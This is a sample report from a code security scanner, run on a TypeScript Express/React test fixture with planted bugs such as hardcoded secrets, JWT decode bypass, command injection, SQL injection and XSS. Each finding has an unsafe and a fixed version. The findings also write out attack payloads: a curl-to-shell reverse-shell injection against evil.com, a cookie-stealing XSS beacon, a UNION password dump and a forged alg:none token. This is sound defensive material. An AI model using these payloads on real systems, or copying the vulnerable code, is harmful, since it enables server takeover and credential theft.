> A real report, produced by running `/vbs-scan-security all lang=en` on the sample app in [`tests/fixtures/typescript`](../../tests/fixtures/typescript) (an Express + React app with planted bugs). Content is unchanged except the "Read more" links, fixed to point at the rule files in this repo. Passwords and tokens in the report are fake values from the sample app.

# vbsec Security Scan Report

**Scope:** Entire repo
**Files:** 11 (5 .ts, 2 .tsx, 1 .json, 3 folders)
**Primary language:** typescript (using specialized rules)
**Mode:** SMALL (inline scan)
**Scan date:** 2026-09-24
**Report language:** en

## VERDICT: FAIL

CRITICAL issues found. DO NOT deploy until fixed.

---

## CRITICAL (blocks deploy) (6) — Overview (details below)

| # | File:Line | Rule |
|---|---|---|
| 1 | `src/lib/config.ts:3` | HARDCODED-SECRET |
| 2 | `src/lib/config.ts:4` | HARDCODED-SECRET |
| 3 | `src/lib/auth.ts:6` | JWT-NONE-ALGORITHM |
| 4 | `src/routes/account.ts:9` | MASS-ASSIGNMENT |
| 5 | `src/routes/convert.ts:8` | COMMAND-INJECTION |
| 6 | `src/routes/search.ts:10` | SQL-INJECTION |

### 🔴 [1] CRITICAL — HARDCODED-SECRET at `src/lib/config.ts:3`

**Short description:** Production database password hardcoded as a literal string inside source code.

**Why is this dangerous?**

Any developer who clones the repo, any AI code assistant that ingests it, any leaked backup, any CI log — all instantly reveal the DB password. If the repo ever becomes public (or is already on a shared server like GitHub Enterprise / GitLab / Bitbucket), automated secret scanners find it within seconds. Once an attacker has the DB password, they can dump customer data, inject rogue admin users, or ransom the database.

**How does an attacker exploit this?**

1. Attacker clones the repo (or reads it via a leaked laptop / stolen commit history / exposed `.git/` directory).
2. Grep for common variable names: `dbPassword`, `password`, `SECRET`.
3. Extract `Pr0d-Db-P@ssw0rd-2024!`.
4. Reach the DB directly (if exposed to the internet), or use it laterally after breaching one internal host.
5. Full read/write on production data — minutes from clone to compromise.

**Current code (UNSAFE)**

```typescript
export const config = {
  port: 3000,
  dbPassword: "Pr0d-Db-P@ssw0rd-2024!",       // hardcoded prod credential
  paymentApiToken: "pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c",
};
```

**Safe code (replace with)**

```typescript
// 1. ROTATE the password NOW (assume it is already compromised).
// 2. Move to environment variable:
export const config = {
  port: Number(process.env.PORT) || 3000,
  dbPassword: process.env.DB_PASSWORD as string,
  paymentApiToken: process.env.PAYMENT_API_TOKEN as string,
};
// 3. Store secrets in AWS Secrets Manager / HashiCorp Vault / Doppler / .env (git-ignored).
// 4. If already pushed to Git: rewrite history with `git filter-repo --path src/lib/config.ts --invert-paths`.
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/generic/01-hardcoded-secret.md)

---

### 🔴 [2] CRITICAL — HARDCODED-SECRET at `src/lib/config.ts:4`

**Short description:** Payment API token hardcoded next to the DB password — same file, same problem.

**Why is this dangerous?**

Payment tokens let the attacker charge customers, refund money to attacker-owned accounts, or drain a merchant balance. Even a "sandbox" token can be pivoted to identify the environment and probe for the live variant. Payment providers (Stripe, Braintree, etc.) treat leaked tokens as a Security Incident requiring rotation and possibly a chargeback investigation.

**How does an attacker exploit this?**

1. Same clone / scanner flow as finding [1].
2. Extract `pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c`.
3. Test the token against the payment API to confirm live.
4. Automate refunds/charges through attacker-controlled accounts.
5. Time from token discovery to first fraudulent charge: minutes.

**Current code (UNSAFE)**

```typescript
paymentApiToken: "pay_tok_7f3a9c2e1b8d4f6a0e5c9b2d7a1f3e8c",
```

**Safe code (replace with)**

```typescript
paymentApiToken: process.env.PAYMENT_API_TOKEN as string,
// + rotate the leaked token via the payment provider dashboard IMMEDIATELY.
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/generic/01-hardcoded-secret.md)

---

### 🔴 [3] CRITICAL — JWT-NONE-ALGORITHM at `src/lib/auth.ts:6`

**Short description:** `jwt.decode()` is used for authentication — it never verifies the signature, so ANY token is accepted, including ones the attacker forges.

**Why is this dangerous?**

`jwt.decode` only base64-decodes the payload; it does NOT check the signature. That means an attacker can craft a token like `{"sub":"1","role":"admin"}`, base64-encode it with an empty signature, send it, and the middleware happily sets `req.user = { sub: 1, role: "admin" }`. From there, every downstream authorization decision (`role === 'admin'`, IDOR check on `sub`) is compromised. This is a full authentication bypass — the entire app runs as any user of the attacker's choosing.

**How does an attacker exploit this?**

1. Attacker crafts JWT header `{"alg":"none","typ":"JWT"}` (base64) + payload `{"sub":"<victim-user-id>","role":"admin"}` (base64) + empty signature.
2. Send request: `Authorization: Bearer <header>.<payload>.`
3. `requireUser` calls `jwt.decode(token)` → returns the forged payload.
4. `req.user.sub` and `req.user.role` are attacker-controlled.
5. Impersonate any user, promote self to admin, drain accounts.

**Current code (UNSAFE)**

```typescript
export function requireUser(req: Request, res: Response, next: NextFunction) {
  const token = (req.headers.authorization || "").replace("Bearer ", "");
  const payload = jwt.decode(token) as { sub: string; role: string } | null;  // NEVER verifies signature
  if (!payload) return res.status(401).end();
  (req as any).user = payload;
  next();
}
```

**Safe code (replace with)**

```typescript
import jwt from "jsonwebtoken";

const JWT_SECRET = process.env.JWT_SECRET as string;  // 32+ random bytes, NOT hardcoded

export function requireUser(req: Request, res: Response, next: NextFunction) {
  const token = (req.headers.authorization || "").replace("Bearer ", "");
  try {
    const payload = jwt.verify(token, JWT_SECRET, {
      algorithms: ["HS256"],   // pin allowed algs → blocks "alg: none" and confusion attacks
    }) as { sub: string; role: string };
    (req as any).user = payload;
    next();
  } catch {
    return res.status(401).end();
  }
}
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/14-jwt-none-algorithm.md)

---

### 🔴 [4] CRITICAL — MASS-ASSIGNMENT at `src/routes/account.ts:9`

**Short description:** `User.update(req.body, ...)` blindly writes every field in the request body — including `role` and `balance` in the model schema.

**Why is this dangerous?**

The `User` model (`src/lib/db.ts:5`) defines `role` (defaults to `"customer"`) and `balance` (defaults to `0`). The PUT `/account` handler passes `req.body` straight to `Sequelize.update()`, so any authenticated user can send `{ "role": "admin", "balance": 999999999 }` and become an admin with unlimited balance — no other exploit needed. Combined with the JWT bypass above (finding [3]), an unauthenticated attacker gets admin + infinite money in two HTTP requests.

**How does an attacker exploit this?**

1. Sign in normally (or forge a token — see finding [3]).
2. Send `PUT /account` with body:
   ```json
   { "name": "me", "role": "admin", "balance": 999999999 }
   ```
3. Sequelize writes all three fields for the current user.
4. Next request as the same user → admin privileges, huge balance.
5. Chain into IDOR / financial abuse.

**Current code (UNSAFE)**

```typescript
router.put("/", requireUser, async (req, res) => {
  const userId = (req as any).user.sub;
  await User.update(req.body, { where: { id: userId } });   // whole body is trusted
  res.json({ ok: true });
});
```

**Safe code (replace with)**

```typescript
router.put("/", requireUser, async (req, res) => {
  const userId = (req as any).user.sub;
  const { name, bio, email } = req.body;   // explicit allow-list
  await User.update({ name, bio, email }, { where: { id: userId } });
  res.json({ ok: true });
});

// Or use a validation library (zod / class-validator) with strip-unknown so extra keys never reach the ORM.
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/07-mass-assignment.md)

---

### 🔴 [5] CRITICAL — COMMAND-INJECTION at `src/routes/convert.ts:8`

**Short description:** `req.body.file` is interpolated into a shell string executed by `child_process.exec()` — the attacker owns the shell.

**Why is this dangerous?**

`exec()` runs the string through `/bin/sh -c`, so shell metacharacters (`;`, `|`, `` ` ``, `$()`, `&&`) are interpreted. The `file` field is user-controlled, so an attacker can append arbitrary shell commands. The endpoint has **no authentication and no rate limit**, so anyone on the internet can send a request. This is Remote Code Execution (RCE) — the highest-severity class of web vulnerability. The attacker runs commands as the Node process user: read `/etc/passwd`, exfiltrate the DB, install a reverse shell, pivot to the internal network.

**How does an attacker exploit this?**

1. `POST /convert` with body:
   ```json
   { "file": "a.png; curl http://evil.com/rat.sh | sh #" }
   ```
2. Shell runs: `convert uploads/a.png; curl http://evil.com/rat.sh | sh # -resize 200x200 thumbs/...`
3. `curl … | sh` downloads and executes a reverse shell.
4. Attacker has a shell on the server.
5. Time from first request to full server compromise: **under 60 seconds**.

**Current code (UNSAFE)**

```typescript
router.post("/", (req, res) => {
  const file = req.body.file;
  exec(`convert uploads/${file} -resize 200x200 thumbs/${file}`, (err, stdout) => {
    if (err) return res.status(500).json({ error: "convert failed" });
    res.json({ ok: true, output: stdout });
  });
});
```

**Safe code (replace with)**

```typescript
import { execFile } from "child_process";
import path from "path";

const SAFE_NAME = /^[a-zA-Z0-9_-]+\.(png|jpg|jpeg|webp)$/;

router.post("/", requireUser, async (req, res) => {   // add auth + rate limit middleware too
  const file = String(req.body.file || "");
  if (!SAFE_NAME.test(file)) return res.status(400).json({ error: "bad filename" });

  const input  = path.join("uploads", file);
  const output = path.join("thumbs",  file);

  // execFile does NOT invoke a shell — each arg is a separate token, no metacharacter parsing.
  execFile("convert", [input, "-resize", "200x200", output], (err, stdout) => {
    if (err) return res.status(500).json({ error: "convert failed" });
    res.json({ ok: true });
  });
});
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/21-command-injection.md) · [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

### 🔴 [6] CRITICAL — SQL-INJECTION at `src/routes/search.ts:10`

**Short description:** `req.query.q` is interpolated into a raw SQL template literal — classic SQL injection over GET.

**Why is this dangerous?**

Template literals look like parameterized queries, but they are just string concatenation. The `q` value comes straight from the URL and is dropped inside `LIKE '%...%'`. An attacker breaks out of the quote and runs any query they want. `sequelize.query(..., { type: QueryTypes.SELECT })` only enforces read intent locally; the DB still executes whatever SQL you send, including `UNION SELECT`, comment stripping, blind boolean-based extraction, or (depending on the driver) stacked queries. Every row in every table this DB user can read is exposed.

**How does an attacker exploit this?**

1. `GET /search?q=%' UNION SELECT id, email, password FROM users -- ` (URL-encoded appropriately).
2. Final SQL: `SELECT id, name, price FROM products WHERE name LIKE '%' UNION SELECT id, email, password FROM users -- %'`
3. Response returns product rows plus every user's email + password hash.
4. Crack password hashes offline; credential-stuff other sites.
5. Time to full DB dump: 5-15 minutes with sqlmap.

**Current code (UNSAFE)**

```typescript
router.get("/", async (req, res) => {
  const q = req.query.q as string;
  const rows = await sequelize.query(
    `SELECT id, name, price FROM products WHERE name LIKE '%${q}%'`,   // string interpolation
    { type: QueryTypes.SELECT }
  );
  res.json(rows);
});
```

**Safe code (replace with)**

```typescript
router.get("/", async (req, res) => {
  const q = String(req.query.q || "");
  const rows = await sequelize.query(
    "SELECT id, name, price FROM products WHERE name LIKE :pattern",
    {
      replacements: { pattern: `%${q}%` },   // driver escapes the value safely
      type: QueryTypes.SELECT,
    }
  );
  res.json(rows);
});

// Reference implementation already exists in the same repo: see src/routes/products.ts, which uses `replacements` correctly.
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/02-sql-injection.md) · [OWASP A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)

---

## HIGH (must fix) (4) — Overview (details below)

| # | File:Line | Rule |
|---|---|---|
| 7 | `src/app.ts:11` | CORS-MISCONFIG |
| 8 | `src/components/Comment.tsx:9` | XSS |
| 9 | `package.json:9` | OUTDATED-DEPENDENCY |
| 10 | `src/routes/convert.ts:6` | MISSING-RATE-LIMIT |

### 🟠 [7] HIGH — CORS-MISCONFIG at `src/app.ts:11`

**Short description:** `cors({ origin: true, credentials: true })` echoes the request Origin AND allows credentials — the classic vulnerable pattern.

**Impact**

`origin: true` tells the `cors` package to reflect whatever `Origin` header the browser sent back as `Access-Control-Allow-Origin`. Combined with `credentials: true`, that means any website the victim visits can make cross-origin requests to this API *with the victim's cookies attached* and read the response. Today the auth uses `Authorization: Bearer` so cookies alone can't hijack sessions, but the moment any cookie is added (session, CSRF, or even a future feature) this becomes a full session-hijack primitive. Also, sensitive API responses can already be read by any origin.

**Fix**

```typescript
// BEFORE
app.use(cors({ origin: true, credentials: true }));

// AFTER — allow-list of exact origins, no wildcard, no reflection
const ALLOWED = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(cors({
  origin: (origin, cb) => {
    if (!origin || ALLOWED.has(origin)) return cb(null, true);
    return cb(new Error("CORS blocked"));
  },
  credentials: true,
}));
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/15-cors-misconfig.md)

---

### 🟠 [8] HIGH — XSS at `src/components/Comment.tsx:9`

**Short description:** `dangerouslySetInnerHTML={{ __html: body }}` renders untrusted HTML from a component prop — stored XSS risk.

**Impact**

`body` is a `string` prop with no sanitization. Whatever the parent passes lands in the DOM as raw HTML. If `body` originates from a comment written by a user (typical for a `Comment` component), an attacker posts a comment containing `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` and every viewer's browser executes it — stealing session tokens, defacing the page, or performing actions on the viewer's behalf.

**Fix**

```typescript
// Option A: render as plain text (simplest, safest)
export function Comment({ author, body }: Props) {
  return (
    <div className="comment">
      <strong>{author}</strong>
      <div>{body}</div>   {/* React auto-escapes */}
    </div>
  );
}

// Option B: if rich text is truly required, sanitize with DOMPurify
import DOMPurify from "dompurify";

export function Comment({ author, body }: Props) {
  const safe = DOMPurify.sanitize(body, { USE_PROFILES: { html: true } });
  return (
    <div className="comment">
      <strong>{author}</strong>
      <div dangerouslySetInnerHTML={{ __html: safe }} />
    </div>
  );
}
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/languages/typescript/03-xss.md)

---

### 🟠 [9] HIGH — OUTDATED-DEPENDENCY at `package.json:9`

**Short description:** `lodash@4.17.20` is vulnerable to CVE-2021-23337 (command injection in `_.template`); fixed in 4.17.21.

**Impact**

`_.template()` in lodash < 4.17.21 lets an attacker inject arbitrary JavaScript into the compiled template function — leading to RCE inside the Node process. Even if this repo doesn't use `_.template` directly today, any transitive user, or a future refactor, can trigger it. Exploit code is publicly available; scanners flag this on every audit.

**Fix**

```bash
# In package.json: bump to at least 4.17.21 (latest is 4.17.21+, most projects should use 4.17.21).
npm install lodash@^4.17.21

# Then run:
npm audit                 # confirm no other known CVEs
npm audit fix             # auto-patch transitive ones
```

Also recommended: commit `package-lock.json`, enable Dependabot / Renovate, and run `npm audit` in CI.

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/generic/20-outdated-dependency.md) · [CVE-2021-23337](https://nvd.nist.gov/vuln/detail/CVE-2021-23337)

---

### 🟠 [10] HIGH — MISSING-RATE-LIMIT at `src/routes/convert.ts:6`

**Short description:** Image-conversion endpoint has no authentication and no rate limit — cheap DoS vector even if the command-injection bug is fixed.

**Impact**

`convert` (ImageMagick) is CPU- and memory-heavy; a single unauthenticated attacker looping this endpoint can pin all CPU cores and fill disk with generated thumbnails, taking the whole app down. On managed platforms (Fargate, Cloud Run) it also converts to a direct billing attack. Rate limiting is required even after the shell-injection fix (finding [5]).

**Fix**

```typescript
import rateLimit from "express-rate-limit";
import { requireUser } from "../lib/auth";

const convertLimiter = rateLimit({
  windowMs: 60_000,   // 1 minute
  max: 10,            // 10 conversions per user per minute
  keyGenerator: (req) => (req as any).user?.sub || req.ip,
});

router.post("/", requireUser, convertLimiter, (req, res) => { /* ... */ });
```

**Read more:** [Rule detail](../../skills/vbs-scan-security/rules/generic/18-missing-rate-limit.md)

---

## PASSED CHECKS

- ✓ SQL-INJECTION — `src/routes/products.ts` uses `replacements` (parameterized) correctly
- ✓ IDOR — `src/routes/account.ts` scopes the update to `user.sub` from the JWT, not from request body
- ✓ SLOPSQUATTING — all `package.json` deps map to well-known npm packages (express, cors, jsonwebtoken, lodash, react, sequelize)
- ✓ BRUTE-FORCE — no login / signup / OTP / password-reset endpoint in scope
- ✓ INSECURE-DESERIALIZATION — no `eval`, `new Function`, `vm.run*`, `yaml.load`, or `node-serialize`
- ✓ SSRF — no `fetch` / `axios` / `http.get` calls with user-controlled URL
- ✓ PATH-TRAVERSAL — no `fs.readFile` / `sendFile` with user input (convert endpoint is caught under COMMAND-INJECTION)
- ✓ CSRF — auth is stateless JWT via `Authorization` header (no cookie session middleware), so classic CSRF vectors don't apply
- ✓ BROKEN-ACCESS-CONTROL — `/account` gated by `requireUser`; `/search`, `/products` are read-only public catalog
- ✓ WEAK-PASSWORD-HASHING — no password hashing / login code in scope
- ✓ UNRESTRICTED-FILE-UPLOAD — no upload handler (`multer` / `formidable`) present
- ✓ VERBOSE-ERROR-DEBUG-MODE — error responses are generic (`{ error: 'convert failed' }`), no stack trace leak
- ✓ RACE-CONDITION — no financial read-modify-write pattern (balance / stock / coupon)

---

## Next steps

Fix the 6 CRITICAL issues first (they compound: JWT bypass + mass assignment + command injection = full server takeover in a single afternoon). Then address the 4 HIGH findings and re-scan to confirm.

---

🤖 Generated by [vbsec](https://github.com/tanviet12/vbsec)

📄 **Report saved to:** `vbsec-reports/scan-2026-09-24-222721.md`

> ⚠️ **Recommendation:** The `vbsec-reports/` directory is not listed in `.gitignore`. To avoid committing scan reports to Git, add `vbsec-reports/` to `.gitignore`.

> This report is a reference — not a substitute for professional security audit.

```json
{
  "verdict": "FAIL",
  "summary": {"critical": 6, "high": 4, "medium": 0, "low": 0, "passed": 13},
  "scope": "all",
  "files_reviewed": 11,
  "primary_language": "typescript",
  "specialized_rules_used": true,
  "mode": "small",
  "date": "2026-09-24",
  "findings": [
    {"file": "src/lib/config.ts", "line": 3, "rule_id": "HARDCODED-SECRET", "severity": "CRITICAL", "issue_summary": "Production DB password hardcoded as string literal", "fix_summary": "Move to env var + rotate the leaked value"},
    {"file": "src/lib/config.ts", "line": 4, "rule_id": "HARDCODED-SECRET", "severity": "CRITICAL", "issue_summary": "Payment API token hardcoded as string literal", "fix_summary": "Move to env var + rotate the token via provider dashboard"},
    {"file": "src/lib/auth.ts", "line": 6, "rule_id": "JWT-NONE-ALGORITHM", "severity": "CRITICAL", "issue_summary": "jwt.decode() used for auth; signature never verified", "fix_summary": "Replace with jwt.verify(token, SECRET, { algorithms: ['HS256'] })"},
    {"file": "src/routes/account.ts", "line": 9, "rule_id": "MASS-ASSIGNMENT", "severity": "CRITICAL", "issue_summary": "User.update(req.body) allows attacker to set role/balance", "fix_summary": "Whitelist fields (name, bio, email) before update"},
    {"file": "src/routes/convert.ts", "line": 8, "rule_id": "COMMAND-INJECTION", "severity": "CRITICAL", "issue_summary": "req.body.file interpolated into exec() shell string", "fix_summary": "Use execFile with arg array + validate filename regex"},
    {"file": "src/routes/search.ts", "line": 10, "rule_id": "SQL-INJECTION", "severity": "CRITICAL", "issue_summary": "req.query.q interpolated into raw SQL template literal", "fix_summary": "Use replacements: { pattern: `%${q}%` } (see products.ts)"},
    {"file": "src/app.ts", "line": 11, "rule_id": "CORS-MISCONFIG", "severity": "HIGH", "issue_summary": "cors({ origin: true, credentials: true }) reflects any origin with credentials", "fix_summary": "Use an explicit allow-list of origins"},
    {"file": "src/components/Comment.tsx", "line": 9, "rule_id": "XSS", "severity": "HIGH", "issue_summary": "dangerouslySetInnerHTML renders unsanitized body prop", "fix_summary": "Render as text, or sanitize with DOMPurify"},
    {"file": "package.json", "line": 9, "rule_id": "OUTDATED-DEPENDENCY", "severity": "HIGH", "issue_summary": "lodash 4.17.20 vulnerable to CVE-2021-23337 (fixed in 4.17.21)", "fix_summary": "npm install lodash@^4.17.21 + npm audit"},
    {"file": "src/routes/convert.ts", "line": 6, "rule_id": "MISSING-RATE-LIMIT", "severity": "HIGH", "issue_summary": "Expensive ImageMagick endpoint has no auth and no rate limit", "fix_summary": "Add requireUser + express-rate-limit (e.g. 10/min per user)"}
  ]
}
```
